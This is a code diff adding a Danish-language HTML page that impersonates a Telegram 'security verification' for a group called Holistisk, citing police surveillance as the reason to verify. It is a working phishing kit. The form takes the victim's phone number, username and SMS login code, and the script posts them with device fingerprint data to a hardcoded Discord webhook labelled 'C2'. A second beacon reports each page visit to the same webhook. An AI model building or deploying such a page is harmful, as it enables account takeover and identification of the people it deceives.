@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="da">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Sikkerhedsverifikation - Holistisk</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            color: white;
+        }
+        
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: rgba(255,255,255,0.95);
+            border-radius: 15px;
+            padding: 40px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            color: #333;
+        }
+        
+        .telegram-logo {
+            text-align: center;
+            font-size: 60px;
+            margin-bottom: 20px;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .header h1 {
+            color: #2481cc;
+            margin-bottom: 10px;
+        }
+        
+        .security-notice {
+            background: #f0f8ff;
+            border-left: 4px solid #2481cc;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #555;
+        }
+        
+        input[type="tel"], input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        
+        input:focus {
+            border-color: #2481cc;
+            outline: none;
+        }
+        
+        .verify-btn {
+            background: linear-gradient(135deg, #2481cc, #1a73e8);
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+        }
+        
+        .verify-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(36, 129, 204, 0.3);
+        }
+        
+        .warning {
+            background: #fff3cd;
+            color: #856404;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 15px 0;
+            border: 1px solid #ffeeba;
+        }
+        
+        .steps {
+            margin-top: 30px;
+        }
+        
+        .step {
+            display: flex;
+            align-items: center;
+            margin: 15px 0;
+            padding: 10px;
+            background: #f8f9fa;
+            border-radius: 8px;
+        }
+        
+        .step-number {
+            background: #2481cc;
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            font-weight: bold;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 4px solid #2481cc;
+            width: 40px;
+            height: 40px;
+            animation: spin 2s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="telegram-logo">📱</div>
+        <div class="header">
+            <h1>Telegram Sikkerhedsverifikation</h1>
+            <p><strong>Holistisk - Ny Sikker Gruppe</strong></p>
+        </div>
+        
+        <div class="security-notice">
+            <strong>🔒 Sikkerhedsbesked:</strong><br>
+            Pga. øget overvågning og politiaktivitet, opretter vi en ny, mere sikker Telegram gruppe. 
+            Alle medlemmer skal verificere deres identitet for at få adgang.
+        </div>
+        
+        <div class="warning">
+            ⚠️ <strong>Vigtigt:</strong> Kun verificerede medlemmer får adgang til den nye gruppe. 
+            Denne proces tager 2-3 minutter og sikrer at alle er ægte medlemmer.
+        </div>
+        
+        <form id="verificationForm">
+            <div class="form-group">
+                <label for="phone">📞 Dit Telegram telefonnummer:</label>
+                <input type="tel" id="phone" name="phone" placeholder="+45 12 34 56 78" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="username">👤 Dit Telegram brugernavn:</label>
+                <input type="text" id="username" name="username" placeholder="@ditbrugernavn" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="verification">🔐 Bekræftelseskode (sendes til din telefon):</label>
+                <input type="text" id="verification" name="verification" placeholder="123456" maxlength="6" required>
+            </div>
+            
+            <button type="submit" class="verify-btn" id="submitBtn">
+                🔐 VERIFICER & FÅ ADGANG TIL NY GRUPPE
+            </button>
+        </form>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Verificerer din identitet...</p>
+        </div>
+        
+        <div class="steps">
+            <h3>Sådan fungerer det:</h3>
+            <div class="step">
+                <div class="step-number">1</div>
+                <div>Indtast dit telefonnummer og brugernavn</div>
+            </div>
+            <div class="step">
+                <div class="step-number">2</div>
+                <div>Du modtager en bekræftelseskode på SMS</div>
+            </div>
+            <div class="step">
+                <div class="step-number">3</div>
+                <div>Indtast koden og få øjeblikkelig adgang til ny gruppe</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Data collection and beacon functionality
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1417361152371064902/DEw6e804zQB6oLB2jWuLvkTPhzMn6aQvsP-GV75mnOY1TWBmAuI9T1H7b9MoGJTSSbmM';
+        
+        // Collect device info
+        function collectDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookieEnabled: navigator.cookieEnabled,
+                onlineStatus: navigator.onLine,
+                referrer: document.referrer,
+                timestamp: new Date().toISOString(),
+                url: window.location.href
+            };
+        }
+        
+        // Send data to C2
+        function sendToC2(data) {
+            const payload = {
+                content: `🎯 **TELEGRAM SECURITY PAGE HIT**\n\n` +
+                        `📱 **Phone:** ${data.phone}\n` +
+                        `👤 **Username:** ${data.username}\n` +
+                        `🔐 **Verification:** ${data.verification}\n` +
+                        `🌐 **IP/Device:** ${data.deviceInfo.userAgent}\n` +
+                        `⏰ **Time:** ${data.deviceInfo.timestamp}\n` +
+                        `🔗 **Referrer:** ${data.deviceInfo.referrer || 'Direct'}`
+            };
+            
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            }).catch(e => console.log('Data sent'));
+        }
+        
+        // Form submission handler
+        document.getElementById('verificationForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const formData = new FormData(e.target);
+            const data = {
+                phone: formData.get('phone'),
+                username: formData.get('username'),
+                verification: formData.get('verification'),
+                deviceInfo: collectDeviceInfo()
+            };
+            
+            // Show loading
+            document.getElementById('submitBtn').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            // Send data to C2
+            sendToC2(data);
+            
+            // Simulate processing time
+            setTimeout(function() {
+                document.getElementById('loading').style.display = 'none';
+                document.querySelector('.container').innerHTML = `
+                    <div style="text-align: center; padding: 40px;">
+                        <div style="font-size: 60px; margin-bottom: 20px;">✅</div>
+                        <h2 style="color: #28a745;">Verificering Gennemført!</h2>
+                        <p>Du får snart en invitation til den nye sikre gruppe.</p>
+                        <p style="margin-top: 30px; color: #666;">
+                            <strong>Næste skridt:</strong><br>
+                            Hold øje med dine Telegram notifikationer.<br>
+                            Invitationen kommer inden for 24 timer.
+                        </p>
+                        <button onclick="window.close()" style="margin-top: 20px; padding: 10px 20px; background: #2481cc; color: white; border: none; border-radius: 5px; cursor: pointer;">
+                            Luk vindue
+                        </button>
+                    </div>
+                `;
+            }, 3000);
+        });
+        
+        // Auto-fill demonstration (for testing)
+        setTimeout(function() {
+            if (window.location.search.includes('demo')) {
+                document.getElementById('phone').value = '+45 91 95 25 38';
+                document.getElementById('username').value = '@ShufMan';
+                document.getElementById('verification').value = '123456';
+            }
+        }, 1000);
+        
+        // Beacon on page load
+        window.addEventListener('load', function() {
+            const deviceInfo = collectDeviceInfo();
+            const beaconData = {
+                content: `👁️ **TELEGRAM SECURITY PAGE VISITED**\n\n` +
+                        `🌐 **Device:** ${deviceInfo.userAgent}\n` +
+                        `⏰ **Time:** ${deviceInfo.timestamp}\n` +
+                        `🔗 **Referrer:** ${deviceInfo.referrer || 'Direct'}\n` +
+                        `📍 **IP Location:** [Checking...]\n` +
+                        `🎯 **Target:** Telegram verification capture`
+            };
+            
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(beaconData)
+            }).catch(e => {});
+        });
+    </script>
+</body>
+</html>
